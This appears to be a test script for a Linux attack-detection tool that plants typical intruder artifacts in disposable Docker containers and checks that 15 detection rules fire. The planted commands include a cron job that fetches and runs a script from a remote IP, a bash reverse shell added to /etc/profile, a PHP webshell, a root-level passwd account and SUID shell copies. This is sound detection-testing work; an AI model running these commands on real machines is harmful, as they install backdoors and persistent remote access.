#!/usr/bin/env bash
# Plants typical attacker artifacts in a container and checks that
# examples/attack/linux.yml finds every one of them.
set -euo pipefail
cd "$(dirname "$0")/../.."

arch=$(docker info -f '{{.Architecture}}' | sed 's/x86_64/amd64/;s/aarch64/arm64/')
mkdir -p test/linux/out-cis
CGO_ENABLED=0 GOOS=linux GOARCH=$arch go build -o test/linux/out-cis/checkmate-linux ./cmd/checkmate

plant='
set -e
echo "*/5 * * * * root curl -s http://198.51.100.7/x | sh" > /etc/cron.d/update
mkdir -p /etc/systemd/system
printf "[Service]\nExecStart=/tmp/.cache/agent\n" > /etc/systemd/system/agent.service
printf "#!/bin/sh\n/usr/local/bin/beacon &\nexit 0\n" > /etc/rc.local; chmod +x /etc/rc.local
echo "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1" >> /etc/profile
echo "export HISTFILE=/dev/null" >> /root/.bashrc
cp /bin/sh /tmp/rootsh; chmod 4755 /tmp/rootsh
cp /bin/sh /usr/bin/fsck.helper; chmod 4755 /usr/bin/fsck.helper
echo "toor:x:0:0::/root:/bin/bash" >> /etc/passwd
mkdir -p /root/.ssh; touch /root/.ssh/authorized_keys; chmod 666 /root/.ssh/authorized_keys
printf -- "-----BEGIN OPENSSH PRIVATE KEY-----\n" > /root/.ssh/id_ed25519; chmod 644 /root/.ssh/id_ed25519
for d in /usr/lib64/security /usr/lib/x86_64-linux-gnu/security /usr/lib/aarch64-linux-gnu/security /lib/security; do
  if [ -d "$d" ]; then cp /bin/true "$d/pam_audit2.so"; break; fi
done
mkdir -p /var/www/html; echo "<?php system(\$_GET[\"c\"]); ?>" > /var/www/html/status.php
cp /bin/sleep /tmp/.x; chmod 755 /tmp/.x
mkdir -p /var/tmp/.k; cp "$(command -v bash)" /var/tmp/.k/bash; /var/tmp/.k/bash -c "sleep 300; :" &
sleep 1
# A preloaded library that exists, so the planted preload does not break programs.
ls /lib64/libm.so.6 /lib/*-linux-gnu/libm.so.6 /usr/lib/*-linux-gnu/libm.so.6 2>/dev/null | sed -n 1p > /etc/ld.so.preload
'

expected="ATT-LNX-CRON-SUSPICIOUS
ATT-LNX-FILELESS
ATT-LNX-HIDDEN-EXECUTABLES
ATT-LNX-HISTORY
ATT-LNX-LD-PRELOAD
ATT-LNX-PAM-UNPACKAGED
ATT-LNX-PRIVATE-KEYS
ATT-LNX-RC-LOCAL
ATT-LNX-SHELL-PROFILE
ATT-LNX-SUID-UNPACKAGED
ATT-LNX-SUID-WRITABLE-DIRS
ATT-LNX-SYSTEMD-SUSPICIOUS
ATT-LNX-UID0
ATT-LNX-WEBSHELL
ATT-LNX-AUTHKEYS-PERMS"

status=0
for image in ${ATTACK_IMAGES:-rocky9 debian12}; do
  echo "== $image"
  docker build -q -t "checkmate-test:$image" -f "test/linux/$image.Dockerfile" test/linux >/dev/null 2>&1
  got=$(docker run --rm -v "$PWD:/src:ro" "checkmate-test:$image" bash -c "{ $plant } >&2
    /src/test/linux/out-cis/checkmate-linux run /src/examples/attack/linux.yml --allow-insecure-policy \
      --format json --attack-layer /tmp/layer.json || true" |
    python3 -c '
import json, sys
r = json.load(sys.stdin)
# Firewall and logs fail in every container; they are not planted.
skip = {"ATT-LNX-FIREWALL", "ATT-LNX-PERSISTENT-LOGS"}
print("\n".join(sorted(x["id"] for x in r["results"] if x["status"] in ("FAIL", "ERROR") and x["id"] not in skip)))')
  if [ "$got" = "$(echo "$expected" | sort)" ]; then echo "ok: all 15 planted artifacts found"; else
    echo "unexpected result:"; diff <(echo "$expected" | sort) <(echo "$got") || true
    status=1
  fi
done
exit $status
